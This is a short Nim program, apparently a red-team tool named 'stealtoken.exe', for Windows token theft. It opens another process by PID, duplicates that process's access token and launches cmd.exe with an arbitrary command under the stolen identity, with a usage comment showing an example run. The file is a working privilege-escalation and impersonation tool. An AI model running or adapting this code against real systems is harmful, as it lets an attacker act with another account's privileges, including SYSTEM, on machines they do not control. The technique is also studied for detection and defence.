import winim/lean
import std/strformat
import os
import strutils
 # CreateProcessWithTokenW sould be used to run single commands it can't display GUI properly.
 #https://stackoverflow.com/questions/21716527/in-windows-how-do-you-programatically-launch-a-process-in-administrator-mode-un/21718198#21718198

proc OpenToken(PID: int,cmdtorun: string): int =

    var cmd = fmt"C:\Windows\System32\cmd.exe /Q /c {cmdtorun}"

    var getproresult = OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID.DWORD)
    if getproresult == 0:
        echo "Failed to open process handle"
        return 1
    echo "[*] pHandle: ",getproresult

    var prochand:  HANDLE
    var resultbool = OpenProcessToken(getproresult, TOKEN_ALL_ACCESS, addr prochand) #https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
    # https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
    if resultbool == FALSE:
        echo "Failed to open process token"
        return 1
    


    var newtoken: HANDLE
    var dupresult = DuplicateTokenEx(prochand,MAXIMUM_ALLOWED,nil,2,1, addr newtoken)
    if bool(dupresult) == FALSE:
        echo "Error duplicating token"
        return 1
    
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    
    si.cb = sizeof(si).DWORD
    var promake = CreateProcessWithTokenW(newtoken,LOGON_WITH_PROFILE,nil,cmd,0,nil,NULL,addr si, addr pi)
    if bool(promake) == FALSE:
        echo "Failed to make process"
        return 1

    return 0


var c = OpenToken(parseInt(paramStr(1)), paramStr(2) )
echo c

# Usage: stealtoken.exe 4929 "whoami > c:\windows\temp"
# Result of command is not returned.

